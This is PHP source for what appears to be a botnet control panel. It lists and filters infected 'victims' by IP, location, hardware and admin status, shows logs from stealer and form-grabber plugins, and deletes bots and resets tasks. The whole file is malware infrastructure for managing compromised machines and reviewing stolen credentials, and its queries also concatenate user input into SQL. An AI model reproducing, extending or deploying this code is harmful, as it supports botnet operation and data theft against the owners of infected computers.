          $this->Objects->MySQL->doQuery("SELECT Country,CountryLong,IP,BuildID,Region, City, PCName, osname, osversion,Admin, CPUName, GPUName,HashRate,creationDate,Online, HEX(GUID) as GUIDString FROM `victims` INNER JOIN `operating_system` ON `osId` = `OS` WHERE GUID = UNHEX('".mysql_real_escape_string( $guid )."')");
          $info = $this->Objects->MySQL->arrayResult();

          $content .= '<table id="tablecss" style="width: 48%; float: left;"><tr><th colspan="2">General Information</th></tr>';
          $content .= '<tr><td><b>Hardware ID (GUID):</b></td><td>'.(!empty($info['GUIDString']) ? $info['GUIDString'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>Build ID:</b></td><td>'.(!empty($info['BuildID']) ? $info['BuildID'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>IP Address:</b></td><td>'.(!empty($info['IP']) ? $info['IP'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>Country:</b></td><td>'.(!empty($info['Country']) ? '<img src="./images/flags/'.$info['Country'].'.gif" />' : '').' '.(!empty($info['CountryLong']) ? $info['CountryLong'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>Region:</b></td><td>'.(!empty($info['Region']) ? $info['Region'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>City:</b></td><td>'.(!empty($info['City']) ? $info['City']  : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>PC Name:</b></td><td>'.(!empty($info['PCName']) ? $info['PCName'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>CPU Name:</b></td><td>'.(!empty($info['CPUName']) ? $info['CPUName'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>GPU Name:</b></td><td>'.(!empty($info['GPUName']) ? $info['GPUName'] : '<i>N/A</i>').'</td></tr>';
          $content .= '<tr><td><b>Operating System (OS):</b></td><td>'.(!empty($info['osname']) ? '<img src="./images/other/'.$this->getOSIcon($info['osname']).'" />' : '').' '.(!empty($info['osname']) ? $info['osname'] : '<i>N/A</i>').' '.(!empty($info['osversion']) ? '['.$info['osversion'].']' : '').(!empty($info['Admin']) ? $this->isBotAdmin($info['Admin']) : '').'</td></tr>';
          $content .= '<tr><td><b>Creation Date:</b></td><td>'.(!empty($info['creationDate']) ? $info['creationDate'] : '').'</td></tr>';
          $content .= '</table>';

          $content .= '<table id="tablecss" style="width: 48%; float: right;"><tr><th colspan="3">More Information</th></tr>';
          if($this->Objects->Plugin->isPluginInstalled('atraxstealer')) {
              $this->Objects->MySQL->doQuery("SELECT COUNT(*) FROM `plugin_atraxstealer` WHERE `GUID` = UNHEX('".mysql_real_escape_string( $guid )."')");
              $clog = $this->Objects->MySQL->arrayResult();
              
              if( $clog[0] > 0 )
                  $content .= '<tr><td><b>Atraxstealer:</b></td><td>'.$clog[0].' Log(s) available</td><td align="right"><form action="?action=plugins&run&name=atraxstealer" method="post"><input type="hidden" name="logs_filter" value="GUID = UNHEX(\''.$guid.'\')" /><input type="submit" style="border: 0px; background-image: url(\'./images/other/page.png\'); background-repeat: no-repeat; cursor: pointer;" name="logs_filter_submit" value="&nbsp;&nbsp;&nbsp; Show Logs" /> </form></td></tr>';
              else
                  $content .= '<tr><td><b>Atraxstealer:</b></td><td colspan="2">No Logs available</td></tr>';
          }
          if($this->Objects->Plugin->isPluginInstalled('formgrabber')) {
              $this->Objects->MySQL->doQuery("SELECT COUNT(*) FROM `plugin_formgrabber` WHERE `GUID` = UNHEX('".mysql_real_escape_string( $guid )."')");
              $clog = $this->Objects->MySQL->arrayResult();
              
              if( $clog[0] > 0 )
                  $content .= '<tr><td><b>Formgrabber:</b></td><td>'.$clog[0].' Log(s) available</td><td align="right"><form action="?action=plugins&run&name=formgrabber" method="post"><input type="hidden" name="glogs_filter" value="GUID = UNHEX(\''.$guid.'\')" /><input type="submit" style="border: 0px; background-image: url(\'./images/other/page.png\'); background-repeat: no-repeat; cursor: pointer;" name="logs_filter_submit" value="&nbsp;&nbsp;&nbsp; Show Logs" /> </form></td></tr>';
              else
                  $content .= '<tr><td><b>Formgrabber:</b></td><td colspan="2">No Logs available</td></tr>';
          }
          $content .= '</table>';


          return $this->setOutput( $content, 'Bot Info');
      }

      /*
       * Set Filter
       */
      public function setFilter( $post )
      {
          if( !empty( $post['bots_filter'] )) {
              $_SESSION['bots_filter'] = $post['bots_filter'];
          }

          if( isset( $post['bots_filter_submit']) && empty( $post['bots_filter'] ))
              unset( $_SESSION['bots_filter'] );

          if( !empty( $post['bots_select'] )) {
              $_SESSION['bots_select'] = $post['bots_select'];
          }

          if( isset( $post['bots_filter_submit'] ) && empty( $post['bots_select'] ))
              unset( $_SESSION['bots_select'] );

          if( isset( $post['bots_filter_reset'] )) {
              unset( $_SESSION['bots_filter'] );
              unset( $_SESSION['bots_select'] );
          } 

          if( !empty( $_SESSION['bots_filter'] ) || !empty( $_SESSION['bots_select'] ))
          {
              if( !empty( $_SESSION['bots_filter'] ))
                  $filter = $this->parseFilter( $_SESSION['bots_filter'] );
              if( !empty( $_SESSION['bots_select'] )) {
                  if( !isset( $filter ) || trim($filter) == "WHERE" )
                      $filter = "WHERE `Country` = '".$_SESSION['bots_select']."'";
                  else
                      $filter .= " AND `Country` = '".$_SESSION['bots_select']."'";
              }
              if( trim($filter) == "WHERE" )
                  unset( $filter );
          }

          if( isset( $filter ))
              $_SESSION['bots_query'] = $filter;
          else
              unset( $_SESSION['bots_query'] );
      }

      /*
       * parse Filter
       */

      public function parseFilter( $string )
      {
          ## String to lower
          $string = strtolower( $string );

          ## Replace special fields
          $string = preg_replace("/buildid\=/", "BuildID=", $string);
          $string = preg_replace("/pcname\=/", "PCName=", $string);
          $string = preg_replace("/cpuname\=/", "CPUName=", $string);
          $string = preg_replace("/gpuname\=/", "GPUName=", $string);
          $string = preg_replace("/os\=/", "OS=", $string);
          $string = preg_replace("/admin\=/", "Admin=", $string);
          $string = preg_replace("/ip\=/", "IP=", $string);
          $string = preg_replace("/country\=/", "CountryLong=", $string);
          $string = preg_replace("/region\=/", "Region=", $string);
          $string = preg_replace("/city\=/", "City=", $string);
          $string = preg_replace("/guid\=/", "GUID=", $string);
          $string = preg_replace("/id\=/", "ID=", $string);

          echo $string;


          ## Split Filter String
          $parts = preg_split("/\&|\||\=/", $string);

          ## Add active pattern between each split
          $c = 0;
          $w = array();
          foreach( $parts as $p )
          {
              $c += strlen($p);
              $w[] = $p;
              if( strlen($string) > $c )
                  $w[] = $string{$c};
              $c++;
          }
          
          ## Get possible field names
          $this->Objects->MySQL->doQuery('SELECT * FROM `victims` INNER JOIN `operating_system` ON `OS` = `osId` LIMIT 1');
          $data = $this->Objects->MySQL->arrayResult();
          
          ## Create Query String
          $lastfield = NULL;
          $query = "WHERE ";
          for($i=0;$i<count($w);$i++)
          {
              if( count($w) < 3 )
                  break;
              if( $w[$i] == "=" )
                  continue;
              if( isset( $w[$i+1]) && $w[$i+1] == "=" ) {
                  if( array_key_exists($w[$i], $data)) {
                      $query .= "( `".$w[$i]."` LIKE ";
                      $lastfield = $w[$i];
                  }
                  else {
                      if( trim($query) != "WHERE" )
                      {
                          $x = 1;
                          while( substr($query, -$x, 1) != "'")
                              $x++;
                          $query = substr( $query, 0, (strlen($query)-($x-3)) );
                          if( isset( $w[$i+3] )) {
                              while( $w[$i+3] != "=" ) {
                                  if( isset( $w[$i+4] ))
                                      $i++;
                                  else {
                                      $i = count($w);
                                      break;
                                  }
                              }
                          }
                          else
                              $i = count($w);
                      }
                      else
                          $i = count($w);
                  }
              }
              elseif( $w[$i] == "&" )
                  $query .= "AND ";
              elseif( $w[$i] == "|" )
                  $query .= "OR ";
              elseif( isset($w[$i-1]) && $w[$i-1] != "=" ) {
                  if( (isset($w[$i+3]) && $w[$i+3] == "=") || !isset($w[$i+1]) )
                      $query .= "`".$lastfield."` LIKE '%".htmlentities($w[$i])."%') ";
                  else
                      $query .= "`".$lastfield."` LIKE '%".htmlentities($w[$i])."%' ";
              }
              else {
                  if( (isset($w[$i+3]) && $w[$i+3] == "=") || !isset($w[$i+1]) )
                      $query .= "'%".htmlentities($w[$i])."%') ";
                  else
                      $query .= "'%".htmlentities($w[$i])."%' ";
              }
          }

          return $query;
      }

      /*
       * Remove inactive bots (7 days)
       */

      public function deleteInactiveBots() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          $count = $this->getNumberOfInactiveBots();
          $content = '';

          if($count > 0) {
              $this->Objects->MySQL->doQuery('DELETE FROM victims WHERE Time < \''.(time() - 604800).'\'');
              $content = $count.' bot(s) successfully deleted';
          } else {
              $content = 'No bots are inactive';
          }

          return $this->setOutput($content, 'Inactive bots');
      }

      /*
       * Reset all
       */

      public function panelReset() {
          if(!$this->isAdmin()) { return $this->getLogin(); }

          if(isset($_GET['csrf']) && $_GET['csrf'] == $_SESSION['csrf']) {
              $this->Objects->MySQL->doQuery('TRUNCATE victims');
              $this->Objects->MySQL->doQuery('TRUNCATE tasks');
			  $this->Objects->MySQL->doQuery('TRUNCATE tasks_victims');
              $this->Objects->MySQL->doQuery('TRUNCATE settings');
              $this->Objects->MySQL->doQuery('TRUNCATE plugins');

              $_SESSION['csrf'] = '';
              Header('Location: index.php?action=statistics');
          }
      }

      /*
       * Login Form
       */

      public function getLogin() {
          if($this->isAdmin()) { header('Location: index.php?action=statistics'); }

          $tpl_login = new Template('login/login.tpl');

          if(isset($_POST['submit'])) {
              $this->Objects->MySQL->doQuery("SELECT ID FROM access_log WHERE reset = '0' AND AccessDate > '".(time()-3600)."'");

              if ($this->Objects->MySQL->numResult() > MAX_LOGIN_FAILED_ATTEMPTS) {
                  $tpl_login->set('error', 'Too many attempts! Try again in 1 hour!');
              }
              elseif($_POST['pass'] == $this->Password) {
                  $_SESSION['admin'] = true;
                  $_SESSION['password'] = $this->Password;
                  $this->Objects->MySQL->doQuery("UPDATE access_log SET reset = '1' WHERE AccessDate > '".(time()-3600)."'");
                  header('Location: index.php?action=statistics');
              }  else {
                  $tpl_login->set('error', 'Unknown password');

                  $client_ip = '';

                  if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                      $client_ip = $this->Objects->MySQL->escapeString($_SERVER['REMOTE_ADDR']);
                  }
                  else {
                      $client_ip = $this->Objects->MySQL->escapeString($_SERVER['HTTP_X_FORWARDED_FOR']);
                  }

                  $agent = $this->Objects->MySQL->escapeString($_SERVER['HTTP_USER_AGENT']);
                  $referer = $this->Objects->MySQL->escapeString($_SERVER['HTTP_REFERER']);
                  $this->Objects->MySQL->doQuery('INSERT INTO `access_log` (`Referer`, `UserAgent`, `IP`, `AccessDate`, `reset`) VALUES (\''.$referer. '\', \''.$agent. '\', \''.$client_ip. '\', \''.time().'\', 0)');
              }
          }

          return $tpl_login->result();
      }

      /*
       * Logout
       */

      public function logoutMe() {
          session_destroy();
          Header('Location: index.php?action=login');
      }


      /*
       * Private Functions
       */

      private function isAdmin() {
          return isset($_SESSION['admin']) && $_SESSION['password'] == $this->Password ? true : false;
      }

      private function setQuickStatistics() {
          $this->checkOnOff();
          $this->Objects->Template->set('all', $this->getNumberOfAllBots());
          $this->Objects->Template->set('on', $this->getNumberOfBots(1));
          $this->Objects->Template->set('off', $this->getNumberOfBots(0));
          $this->Objects->Template->set('today', $this->getNumberOfBotsToday());
          $this->Objects->Template->set('lastseven', $this->getNumberOfBotsLast7Days());
      }

      private function setDateTime() {
          $this->Objects->Template->set('date', date('d.m.Y - H:i'));
      }

      private function setNavigation() {
          $navigation = array('<img src="images/other/statistic.png" alt="" /> Statistics' => '?action=statistics', '<img src="images/other/bots.png" alt="" /> Bots' => '?action=bots', '<img src="images/other/plugins.png" alt="" /> Plugins' => '?action=plugins', '<img src="images/other/tasks.png" alt="" />  Tasks' => '?action=tasks', '<img src="images/other/settings.png" alt="" /> Settings' => '?action=settings', '<img src="images/other/logout.png" alt="" /> Logout' => '?action=logout');
          $nav = '';

          foreach ($navigation as $name=>$link) {
              $nav .= '<a href="'.$link.'">'.$name.'</a>';
          }

          $this->Objects->Template->set('navigation', $nav);
      }

      private function setOutput($content, $title) {
          $this->Objects->Template->set('content', $content);
          $this->Objects->Template->set('active', $title);
          return $this->Objects->Template->result();
      }

      private function getNumberOfAllBots() {
          $this->Objects->MySQL->doQuery('SELECT GUID FROM victims');
          return $this->Objects->MySQL->numResult();
      }

      private function getNumberOfBots($value) {
          $this->Objects->MySQL->doQuery('SELECT GUID FROM victims WHERE online = \''.$value.'\'');
          return $this->Objects->MySQL->numResult();
      }

      private function getNumberOfBotsToday() {
          $this->Objects->MySQL->doQuery('SELECT GUID FROM victims WHERE Connected > \''.(time() - 86400).'\'');
          return $this->Objects->MySQL->numResult();
      }

      private function getNumberOfInactiveBots() {
          $this->Objects->MySQL->doQuery('SELECT GUID FROM victims WHERE Time < \''.(time() - 604800).'\'');
          return $this->Objects->MySQL->numResult();
      }

      private function getNumberOfBotsLast7Days() {
          $this->Objects->MySQL->doQuery('SELECT GUID FROM victims WHERE Connected > \''.(time() - 604800).'\'');
          return $this->Objects->MySQL->numResult();
      }

      private function checkOnOff() {
          $this->Objects->MySQL->doQuery('SELECT Time, Online, GUID  FROM victims WHERE online = \'1\'');

          while($victim = $this->Objects->MySQL->arrayResult()) {
              if($victim['Time'] <= (time() - INTVAL)) {
                  mysql_query('UPDATE victims SET Online = \'0\' WHERE GUID = \''.$victim['GUID'].'\'');
              }
          }
      }

      private function parseCountries($value) {
          $return = '';

          if(!empty($value)) {
              $teile = explode(',', $value);
              for ($i = 0; $i <= count($teile); $i++) {
                  if(!empty($teile[$i])) {
                      if( file_exists( 'images/flags/'.trim( $teile[$i] ).'.gif' ))
                          $return .= '<img src="images/flags/'.trim( $teile[$i] ).'.gif" alt="'.$teile[$i].'" title="'.trim( $teile[$i] ).'" />&nbsp;';
                  }
              }
          }

          return !empty($value) ? $return : '<img src="images/flags/01.gif" /> All';
      }

      private function parseParameters($parameters) {
          $return = '';

          if(!empty($parameters) && strpos($parameters, '#')) {
              $teile = explode('#', $parameters);
              for ($i = 0; $i < count($teile); $i++) {
                  if(!empty($teile[$i])) {
                      $teile[$i] = $this->convertString($teile[$i]);

                      //Use plugin dropdown (BETA)
                      if(strtolower($teile[$i]) == 'plugin') {
                          $return .= '<p>'.strtoupper(substr($teile[$i], 0, 1)).substr($teile[$i], 1).':</p> '.$this->generatePluginField($this->removeWhitespaces($teile[$i])).'<p>';
                      } else {
                          $return .= '<p>'.strtoupper(substr($teile[$i], 0, 1)).substr($teile[$i], 1).':</p> <input type="text" name="'.$this->removeWhitespaces($teile[$i]).'" /><p>';
                      }
                  }
              }
          }

          return !empty($parameters) ? $return : '';
      }

      private function generatePluginField($name) {
          $handle = opendir('plugins');
          $html = '<select name="'.$name.'" size="1">';

          while ($file = readdir($handle)) {
              if(!is_dir($file) && file_exists('plugins/'.$file.'/info.php')) {
                  if($this->Objects->Plugin->isPluginInstalled($file)) {
                      include('plugins/'.$file.'/info.php');
                      $html .= '<option value="'.$file.'">'.$this->convertString($PLUGIN_NAME).'</option>';
                  }
              }
          }

          $html .= '</select>';
          closedir($handle);

          return $html;
      }

      private function ectractFullName($name) {
          if(file_exists('settings/'.$name.'.lip')) {
              $filehandle = fopen('settings/'.$name.'.lip', 'r');
              $line = fgets($filehandle, 4096);

              if(strpos($line, '|')) {
                  $teile = explode('|', $line);
                  if(!empty($teile[0])) {
                      return $teile[0];
                  }
              } else {
                  return $name;
              }
          } else {
              return $name;
          }
      }

      private function getOSIcon($value) {
          if(strpos($value, '8')) {
              return 'win8.png';
          } else {
              return 'win.png';
          }
      }

      private function isBotAdmin($value) {
          return strtolower($value) == 'y' ? ' (A)' : ' (U)';
      }

      private function isOverTime($value) {
          return $value == '0' ? '-' : date('Y-m-d H:i:s', $value);
      }

      private function convertString($value) {
          return htmlentities($value);
      }

	 private function removeBadChars($value) {
          $valuenew = str_replace(' ', '', $value);
		  $valuenew = str_replace('.', '', $valuenew);
		  $valuenew = str_replace('(', '', $valuenew);
		  $valuenew = str_replace(')', '', $valuenew);
		  $valuenew = str_replace('\n', '', $valuenew);
		  $valuenew = str_replace('\r', '', $valuenew);
		  return $valuenew;
      }
      private function removeWhitespaces($value) {
          return str_replace(' ', '', $value);
      }
  }